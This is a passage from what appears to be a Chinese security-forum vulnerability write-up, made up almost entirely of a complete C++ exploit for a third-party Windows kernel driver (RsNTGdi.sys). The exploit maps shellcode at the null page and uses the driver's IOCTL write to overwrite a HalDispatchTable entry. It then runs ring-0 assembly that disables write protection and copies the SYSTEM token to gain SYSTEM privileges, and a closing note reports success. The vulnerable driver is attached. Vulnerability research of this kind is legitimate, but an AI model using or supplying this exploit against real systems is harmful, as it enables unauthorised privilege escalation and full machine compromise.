
```cpp
// exploit.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。

#include <cstdio>
#include <cstdlib>
#include <windows.h>
#include "ntapi.h"

#pragma comment(linker, "/defaultlib:ntdll.lib")

#define LINK_NAME "\\\\.\\RSNTGDI"
#define IOCTL 0x83003C0B
#define INPUT_BUFFER_LENGTH 4
#define OUT_BUFFER_LENGTH 4
#define PAGE_SIZE 0x1000
#define KERNEL_NAME_LENGTH 0X0D

void ShowError(PCHAR msg, NTSTATUS status);
NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength);

BOOL g_bIsExecute = FALSE;

int main()
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE hDevice = NULL;
	DWORD dwReturnLength = 0, ShellCodeSize = PAGE_SIZE;
	PVOID ShellCodeAddress = NULL;
	PSYSTEM_MODULE_INFORMATION pModuleInformation = NULL;
	DWORD dwImageBase = 0;
	PVOID pMappedBase = NULL;
	UCHAR szImageName[KERNEL_NAME_LENGTH] = { 0 };
	UNICODE_STRING uDllName;
	PVOID pHalDispatchTable = NULL, pXHalQuerySystemInformation = NULL;
	DWORD dwDllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;

	// 获得0地址的内存
	ShellCodeAddress = (PVOID)sizeof(ULONG);
	status = NtAllocateVirtualMemory(NtCurrentProcess(),
									 &ShellCodeAddress,
									 0,
									 &ShellCodeSize,
									 MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
									 PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
		printf("NtAllocateVirtualMemory Error 0x%X\n", status);
		goto exit;
	}

	// 将ShellCode写到申请的0地址空间中
	RtlMoveMemory(ShellCodeAddress, (PVOID)Ring0ShellCode, ShellCodeSize);

	// 此时dwReturnLength是0，所以函数会由于长度为0执行失败
	// 然后系统会在第四个参数指定的地址保存需要的内存大小
	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
									  &dwReturnLength);
	if (status != STATUS_INFO_LENGTH_MISMATCH)
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// 按页大小对齐
	dwReturnLength = (dwReturnLength & 0xFFFFF000) + PAGE_SIZE * sizeof(ULONG);
	pModuleInformation = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL,
																  dwReturnLength,
																  MEM_COMMIT | MEM_RESERVE,
																  PAGE_READWRITE);
	if (!pModuleInformation)
	{
		printf("VirtualAlloc Error");
		goto exit;
	}

	status = ZwQuerySystemInformation(SystemModuleInformation,
									  pModuleInformation,
									  dwReturnLength,
									  &dwReturnLength);
	if (!NT_SUCCESS(status))
	{
		ShowError("ZwQuerySystemInformation", status);
		goto exit;
	}

	// 模块加载的基地址
	dwImageBase = (DWORD)(pModuleInformation->Module[0].Base);

	// 获取模块名
	RtlMoveMemory(szImageName,
				  (PVOID)(pModuleInformation->Module[0].ImageName + pModuleInformation->Module[0].PathLength),
				  KERNEL_NAME_LENGTH);

	// 转换为UNICODE_STRING类型
	RtlCreateUnicodeStringFromAsciiz(&uDllName, (PUCHAR)szImageName);

	status = (NTSTATUS)LdrLoadDll(NULL,
								  &dwDllCharacteristics,
								  &uDllName,
								  &pMappedBase);
	if (!NT_SUCCESS(status))
	{
		ShowError("LdrLoadDll", status);
		goto exit;
	}

	// 获取内核HalDispatchTable函数表地址
	pHalDispatchTable = GetProcAddress((HMODULE)pMappedBase, "HalDispatchTable");
	if (pHalDispatchTable == NULL)
	{
		printf("GetProcAddress Error\n");
		goto exit;
	}

	pHalDispatchTable = (PVOID)((DWORD)pHalDispatchTable - (DWORD)pMappedBase + dwImageBase);
	pXHalQuerySystemInformation = (PVOID)((DWORD)pHalDispatchTable + sizeof(ULONG));

	// 打开驱动设备
	hDevice = CreateFile(LINK_NAME,
						GENERIC_READ | GENERIC_WRITE,
						0,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						0);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("CreateFile Error");
		goto exit;
	}

	DWORD dwInput = 0;

	// 与驱动设备进行第一次交互，将0保存到dword_80012648中
	if (!DeviceIoControl(hDevice,
						 IOCTL,
						 &dwInput,
						 INPUT_BUFFER_LENGTH,
						 &dwInput,
						 OUT_BUFFER_LENGTH,
						 &dwReturnLength,
						 NULL))
	{
		printf("DeviceIoControl Error");
		goto exit;
	}

	// 与驱动设备进行第二次交互，将0写入到XHalQuerySystemInformation中
	if (!DeviceIoControl(hDevice,
						 IOCTL,
						 &dwInput,
						 INPUT_BUFFER_LENGTH,
						 pXHalQuerySystemInformation,
						 OUT_BUFFER_LENGTH,
						 &dwReturnLength,
						 NULL))
	{
		printf("DeviceIoControl Error");
		goto exit;
	}

	status = NtQueryIntervalProfile(ProfileTotalIssues, NULL);
	if (!NT_SUCCESS(status))
	{
		ShowError("NtQueryIntervalProfile", status);
		goto exit;
	}

	if (g_bIsExecute)
		printf("Ring0 代码执行完成\n");

exit:
	if (pModuleInformation)
		VirtualFree(pModuleInformation, dwReturnLength, MEM_DECOMMIT | MEM_RELEASE);
	if (hDevice)
		NtClose(hDevice);
	if (pMappedBase)
		LdrUnloadDll(pMappedBase);

	system("pause");
	return 0;
}

NTSTATUS Ring0ShellCode(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
{
	// 关闭页保护
	__asm
	{
		cli
		mov eax, cr0
		and eax, ~0x10000
		mov cr0, eax
	}

	__asm
	{
		// 取当前线程
		mov eax, 0xFFDFF124
		mov eax, [eax]

		// 取线程对应的EPROCESS
		mov esi, [eax + 0x220]
		mov eax, esi

	searchXp:
		mov eax, [eax + 0x88]
		sub eax, 0x88
		mov edx, [eax + 0x84]
		cmp edx, 0x4
		jne searchXp
		mov eax, [eax + 0xC8]
		mov [esi + 0xC8], eax
	}

	// 开起页保护
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	g_bIsExecute = TRUE;
}

void ShowError(PCHAR msg, NTSTATUS status)
{
	printf("%s Error 0x%X\n", msg, status);
}

void ShowError(PCHAR msg)
{
	printf("%s Error 0x%X\n", msg, GetLastError());
}
```

## 四、运行结果

可以看到，写入到0地址的代码顺利执行，程序提权成功。

![](https://bbs.kanxue.com/upload/attach/202111/835440_G2HW62JSUJG8XDM.jpg)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2021-12-2 09:42 被1900编辑，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)

上传的附件：

- [RsNTGdi.idb](javascript:void(0);)

  （460.62kb，11次下载）

- [RsNTGdi.sys](javascript:void(0);)

  （10.39kb，16次下载）

- [bootvid.dll](javascript:void(0);)

  （12.00kb，11次下载）
